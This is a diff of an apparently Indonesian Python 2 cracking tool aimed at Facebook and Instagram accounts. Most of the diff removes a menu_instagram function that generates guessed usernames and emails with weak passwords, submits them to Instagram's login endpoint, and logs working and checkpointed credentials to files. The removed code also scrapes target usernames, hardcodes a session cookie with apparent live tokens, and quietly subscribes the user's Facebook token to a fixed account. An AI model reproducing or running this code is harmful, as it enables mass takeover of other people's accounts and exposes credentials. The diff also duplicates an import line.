@@ -4,6 +4,8 @@ import requests,sys,random,re,base64,json
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
 from bs4 import BeautifulSoup as parser
+from menu_instagram import menu_instagram
+from menu_instagram import menu_instagram
 from urllib2 import urlopen
 from cek_opsi import cek_opsi
 reload(sys)
@@ -32,11 +34,6 @@ logo = ("""\x1b[1;92m ___ ___ ___ __  __ ___ _   _ __  __
 \x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m gh : github.com/rozhakxd
 \x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
 """)
-live = []
-chek = []
-die = []
-stop = False
-link =("https://gramho.com")
 hostm=("https://m.facebook.com")
 url=('http://ipinfo.io/json')
 response=urlopen(url)
@@ -50,10 +47,6 @@ ua=random.choice(["Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv)
 "NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
 "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G977N/KSU4CTG1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36"])
 mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-useragent=random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
-"Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",])
 uac=("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
 def basecookie():
 	if os.path.exists("_____rozhak_____"):
@@ -754,221 +747,6 @@ def daftar_menu():
 			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
 	else:
 		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
-def menu_instagram():
-	global ip, region
-	try:
-                token=open('___rozhak___','r').read()
-        except IOError:
-                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
-                os.system('rm -rf ___rozhak___')
-                time.sleep(2)
-                login()
-	try:
-                otw = requests.get('https://graph.facebook.com/me?access_token=' +token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
-                a = json.loads(otw.text)
-		nama = a['name']
-	except KeyError:
-		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid")
-		os.system('rm -rf ___rozhak___')
-		time.sleep(2)
-		login()
-	os.system("clear")
-	print(logo)
-	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Ip : "+ip)
-	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Nama : "+nama)
-	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Region : "+region)
-
-	print("\n\x1b[1;96m[\x1b[1;97m1\x1b[1;96m]\x1b[1;97m Crack Dari Username Huruf+Angka")
-	print("\x1b[1;96m[\x1b[1;97m2\x1b[1;96m]\x1b[1;97m Crack Dari Username Huruf_Angka")
-	print("\x1b[1;96m[\x1b[1;97m3\x1b[1;96m]\x1b[1;97m Crack Dari Email Nama+Angka")
-	print("\x1b[1;96m[\x1b[1;97m4\x1b[1;96m]\x1b[1;97m Crack Dari Email Huruf")
-	print("\x1b[1;96m[\x1b[1;97m5\x1b[1;96m]\x1b[1;97m Crack Dari Email Angka")
-	print("\x1b[1;96m[\x1b[1;97m6\x1b[1;96m]\x1b[1;97m Crack Dari Query V1")
-	print("\x1b[1;96m[\x1b[1;97m7\x1b[1;96m]\x1b[1;97m Crack Dari Query V2")
-	print("\x1b[1;97m[\x1b[1;93m0\x1b[1;97m]\x1b[1;93m Kembali")
-	menu=raw_input("\n\x1b[1;92m[\x1b[1;97m#\x1b[1;92m]\x1b[1;97m Choose :\x1b[1;92m ")
-	if menu == "":
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
-	elif menu == "1":
-		nama=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m ").lower()
-                pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
-                print("\x1b[1;97m ")
-                for i in range(1000):
-                        number=random.randint(1, 999)
-                        user=(nama+str(number))
-			crack(user,pw)
-	elif menu == "2":
-                nama=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m ").lower()
-                pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
-                print("\x1b[1;97m ")
-                for i in range(100):
-                        number=random.randint(1, 99)
-                        user=(nama+"_"+str(number))
-                        crack(user,pw)
-	elif menu == "3":
-		nama=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m ").lower()
-                tipe=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Tipe Email :\x1b[1;96m ")
-                pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
-                print("\x1b[1;97m ")
-                for i in range(1000):
-                        number=random.randint(1, 999)
-                        email=(nama+str(number)+tipe)
-                        crack(email,pw)
-	elif menu == "4":
-                tipe=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Tipe Email :\x1b[1;96m ")
-                print("\x1b[1;97m ")
-                for i in range(1500):
-                        low = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
-                        b=random.randint(0,7)
-                        low1 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
-                        b1=random.randint(0,7)
-                        low2 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
-                        b2=random.randint(0,7)
-                        low3 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
-                        b3=random.randint(0,7)
-                        low4 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
-                        b4=random.randint(0,7)
-                        low5 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
-                        b5=random.randint(0,7)
-                        x=(low[b])
-                        x1=(low1[b1])
-                        x2=(low2[b2])
-                        x3=(low3[b3])
-                        x4=(low4[b4])
-                        x5=(low5[b5])
-                        count=random.choice([x+x1+x2,x+x1+x2+x3,x+x1+x2+x3+x4,x+x1+x2+x3+x4+x5])
-                        huruf=(count)
-                        email=(huruf+tipe)
-                        pw=(huruf+"123")
-                        crack(email,pw)
-	elif menu == "5":
-		domain=("@gmail.com")
-                print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Tipe Email :\x1b[1;96m "+domain)
-                print("\x1b[1;97m ")
-                for i in range(1500):
-                        number=random.randint(111111, 999999)
-                        em_angka=(str(number)+domain)
-                        pw=(str(number))
-                        crack(em_angka,pw)
-	elif menu == "6":
-		nama=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Query :\x1b[1;96m ").lower()
-                pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
-                print("\x1b[1;97m ")
-                query().getquery(nama,pw)
-	elif menu == "7":
-		query_v2()
-	elif menu == "8":
-		print("\x1b[1;96m[\x1b[1;97m1\x1b[1;96m]\x1b[1;97m Lihat Hasil\x1b[1;92m Ok")
-                print("\x1b[1;96m[\x1b[1;97m2\x1b[1;96m] Lihat Hasil\x1b[1;93m Cp")
-                print("\x1b[1;97m[\x1b[1;93m0\x1b[1;97m]\x1b[1;93m Kembali")
-                lihat = raw_input("\n\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;96m ")
-                if lihat == "":
-                        exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
-                elif lihat == "1":
-                        try:
-                                ok=open('Insta_Ok.txt','r').read()
-                        except IOError:
-                                exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Hasil Ok Tidak Ada")
-                        print("\x1b[1;92m"+ok)
-                elif lihat == "2":
-                        try:
-                                cp=open('Insta_Cp.txt','r').read()
-                        except IOError:
-                                exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Hasil Cp Tidak Ada")
-                        print("\x1b[1;93m"+cp)
-                elif lihat == "0":
-                        menu_instagram()
-                else:
-                        exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
-	elif menu == "0":
-		menu()
-	else:
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
-def crack(username, password):
-	print'\r\x1b[1;97m[Crack] Ok:%s - Cp:%s - Die:%s' % (len(live), len(chek), len(die)),
-	sys.stdout.flush()
-	url = "https://www.instagram.com/"
-	sesi = requests.Session()
-	header = {
-		'Accept-Encoding': 'gzip, deflate',
-		'Accept-Language': 'en-US,en;q=0.8',
-		'Connection': 'keep-alive',
-		'Content-Length': '0',
-		'Host': 'www.instagram.com',
-		'Referer': 'https://www.instagram.com/',
-		'User-Agent': useragent,
-		'X-Instagram-AJAX': '1',
-		'X-Requested-With': 'XMLHttpRequest'
-	}
-	sesi.headers.update(header)
-	sesi.cookies.update({
-		'sessionid': '', 'mid': '', 'ig_pr': '1',
-		'ig_vw': '1920', 'csrftoken': '',
-		's_network': '', 'ds_user_id': ''
-	})
-	sesi.get('https://www.instagram.com/web/__mid')
-	sesi.headers.update({'X-CSRFToken': sesi.cookies.get_dict()['csrftoken']})
-	enc_pass = '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()), password)
-	data_post = {
-		"username": username,
-		"enc_password": enc_pass
-	}
-	try:
-		req = sesi.post("https://www.instagram.com/accounts/login/ajax/", data=data_post, allow_redirects=True).json()
-		if req["authenticated"] == True:
-			print("\r\x1b[1;92m[Ok] "+username+"|"+password+"         ")
-			live.append(username+"|"+password)
-			save=open("Insta_Ok.txt", "a")
-			save.write(username+"|"+password+"\n")
-			save.close()
-		else:
-			die.append(username+""+password)
-	except KeyError:
-		if "Please wait" in req["message"]:
-			print("\r\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Crack Limit Silahkan Tunggu Sebentar...")
-			time.sleep(120)
-		else:
-			print("\r\x1b[1;93m[Cp] "+username+"|"+password+"          ")
-			chek.append(username+"|"+password)
-			save=open("Insta_Cp.txt", "a")
-                        save.write(username+"|"+password+"\n")
-                        save.close()
-class query:
-	def getquery(self, search, password):
-		url = link+"/search/"+search
-		getData = requests.get(url, headers={"user-agent": useragent}).text
-		htmlBeauti = parser(getData, "html.parser")
-		for username in htmlBeauti.find_all("div", class_="result-username"):
-			userid = username.text.replace("@","")
-			crack(userid, password)
-head = {
-'HOST': "www.instagram.com",
-'KeepAlive' : 'True',
-'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
-'Cookie': 'mid=YSnwAwABAAGcP8U__eZOXNfoDJdA; ig_did=5C47028B-01A6-40CF-A8CB-0C22E54A0D37; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; fbsr_124024574287414=TFQpfhizsCMxS9eNZynAdlP7E5xwyP0dqHvPagKil2E.eyJ1c2VyX2lkIjoiMTAwMDM2NTA2MTk4NjI4IiwiY29kZSI6IkFRQTYwMWNpd0VTSXVuQ1hITldyTHlKR1JjMEFySGtQMm1WWVoxbWxwdDQtWkhjQkhJR1JrZFJsZ2dnX3FHWURib2xvbkxzbDA5VnNvYi0zTzc2UjI4ZFR3ZHMzc1VmazBzbnQwNF9HLUw5bWNXQ1d6czFSREQ3N3JmeXVVdGVwaXZ0RGVoZFhPNXBCTGVpcU1ZZHhSU2FKSE9fSExJX0ZqOHlKWWVMWmdHMmdRNlNKZTJnUHpxa3Z4RFVralFPdEhTaWUtTDNNTHdFRS1SbGpveEJCNm5abnNlYTRTUE95Z0xzQ2RlRlhSZXBDWnNBV1ZqbmZDZFo1NUk4VWtCVDNkbUxScEVJdURnZTBOX2RwbzA4aVppTVFPUU8yVHhKeFdERk1kWE8tS296cUowbFpzLWdQV3Vvb0R1WGk0UHp1b1NFbWU0aE8yMHdVNTkxM0hETFQ5em9tIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUxLNWNmc0VuZktzM0k0OVQxRFpBdjlISzY3a2VBY3VTS2xIOHBNaGMxeFJnektveklvd1BXdFZqQkpBWkNnZ1A3Y09GZXlyTGN6NWpjeDBIY0VXUlBkcXlYWkFHajFJQkUzWkM3REVhUXBHMjZEV2FQWkFFNXlFcWxsdjZKbzNySHN0TjRNWDE4T2ZMNVNZWkNJWkJjakVsSjhaQlNJajM3c0Q3S2lPUnVXRkcyQXlKR0htYnF0amMxdElaQXZhU3JBWkRaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjMxOTI3MzkxfQ; ds_user_id=14958828655; csrftoken=UvDJ8XTfXCNQ2qnmoRui10iLQETDX2W3; sessionid=14958828655%3AAJmi00Y476z5Hj%3A12; shbid="9776\05414958828655\0541663463393:01f7181afc78a3771c0c86d394d5b2965ee08f264fd795effa6578839bd3b7cc51ff0a62"; shbts="1631927393\05414958828655\0541663463393:01f7e6f65ebf92959d2b7851ec21c720d4c0fb15c10ed2ef19aa3f07370fba0de34a7300"; rur="EAG\05414958828655\0541663472958:01f767d0ebf0d584e79b15a13262eaa8c14a66e16073dd934e41645a537fa8ae1174dff5"',
-'Accept' : "*/*",
-'ContentType' : "application/x-www-form-urlencoded",
-"X-Requested-With" : "XMLHttpRequest",
-"X-IG-App-ID": "936619743392459",
-"X-Instagram-AJAX" : "missing",
-"X-CSRFToken" : "missing",
-"Accept-Language" : "en-US,en;q=0.9"
-}
-def query_v2():
-        try:
-                query=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Query :\x1b[1;96m ").lower()
-                pw =raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
-		print("\x1b[1;97m ")
-		ruks = requests.Session()
-                url_id = 'https://www.instagram.com/web/search/topsearch/?context=blended&query=25.'+query
-                mn = 0
-                req_id = ruks.get(url_id,headers=head).json()
-                while True:
-                        mn+=1
-                        y = str(req_id['users'][mn]['user']['username'])
-                        crack(y,pw)
-        except Exception as e:
-		print("\n\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Dump Limit Crack Selesai...")
 def generate(text):
 	global country
 	results=[]
